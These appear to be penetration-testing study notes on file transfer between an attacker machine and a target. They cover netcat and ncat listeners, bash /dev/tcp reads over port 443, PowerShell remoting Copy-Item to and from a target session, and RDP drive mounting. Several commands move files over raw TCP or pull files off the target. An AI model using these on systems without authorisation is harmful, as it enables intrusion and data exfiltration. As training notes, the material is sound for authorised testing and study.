## Netcat
- **Ncat**: Modern implementation of of Netcat that supports SSL, IPv6, SOCKS, and HTTP proxies, connection brokering, and more
### File Transfer with Netcat and Ncat
1. **Transferring Files Normally**
	1. **Target Machine - Listening on Port 8000**
		1. **Netcat**
			- `nc -l -p 8000 > [new local file]`
		2. **Ncat**
			- `ncat -l -p 8000 --recv-only > [new local file]`
	2. **Personal Machine - Sending File to Target Machine**
		1. **Netcat**
			- `nc -q 0 [target machine ip address] 8000 < [local file to be sent]`
		2. **Ncat**
			- `ncat --send-only [target machine ip address] 8000 < [local file to be sent]`
2. **Sending File as Input**
	1. **Personal Machine - Sending File as Input to Netcat/Ncat**
		1. **Netcat**
			- `sudo nc -l -p 443 -q 0 < [local file to be sent]`
		2. **Ncat**
			- `sudo ncat -l -p 443 --send-only < [local file to be sent]`
	2. **Target Machine - Connect to NetCat/Ncat to Receive the File**
		1. **Netcat**
			- `nc [personal machine ip address] 443 > [new local file]`
		2. **Ncat**
			- `ncat [personal machine ip address] 443 --recv-only > [new local file]`
3. **Transferring File via /dev/tcp**
	- If there isn't Netcat or Ncat on target machine, Bash supports read/write operations on a pseudo device like **/dev/tcp**
	1. **Personal Machine - Sending File as Input to Netcat/Ncat**
		1. **Netcat**
			- `sudo nc -l -p 443 -q 0 < [file to be sent]`
		2. **Ncat**
			- `sudo ncat -l -p 443 --send-only < [file to be sent]`
	2. **Target Machine - Connecting to Netcat/Ncat Using /dev/tcp to Receive the File**
		- `cat < /dev/tcp/[personal machine ip address]/443 > [new local file]`

## PowerShell Session File Transfer
- In case HTTP, HTTPS, or SMB are unavailable, we can use **PowerShell Remoting**, aka **WinRM**
1. **Personal Machine - Confirm WinRM port TCP 5985 is Open on Target Machine**
	- `Test-NetConnection -ComputerName [target machine hostname] -port 5985`
2. **Personal Machine - Create a PowerShell Remoting Session to Target Machine**
	- `$Session - New-PSSession -ComputerName [target machine hostname]`
3. **Personal Machine in Session with Target Machine - Copy File from our Localhost to the Target Machine Session**
	- `Copy-Item -Path C:\[path to file to be sent] -ToSession $Session -Destination C:\[path of where to send]`
4. **Personal Machine inn Session with Target Machine - Copy File from Target Machine to our Localhost**
	- `Copy-Item -Path "C:\[path of the file to be sent]" -Destination C:\[path of where to send] -FromSession $Session`

## RDP
- We can use `rdesktop` or `xfreerdp` to copy and paste files using GUI directly
- In certain scenarios GUI copy and pasting doesn't work
- As alternative, we can mount a local resource on the target RDP server
1. **Personal Machine - Mounting a Linux Folder**
	1. **Using rdesktop**
		- `rdesktop [target machine ip address] -d [domain] -u administrator(username) -p '[password]' -r disk:linux='[path to the directory to mount]'`
	2. **Using xfreerdp**
		- `xfreerdp /v:[target machine ip address] /d:[domain] /u:administrator(username) /p:'[password]' /drive:linux,[path to the directory to mount]`
2. **Target Machine - Accessing the Directory** 
	- To access the directory, we can connect to `\\tsclient\`, allowing us to transfer files to and from the RDP session
	- Alternatively, the native **mstsc.exe** remote desktop client can be used
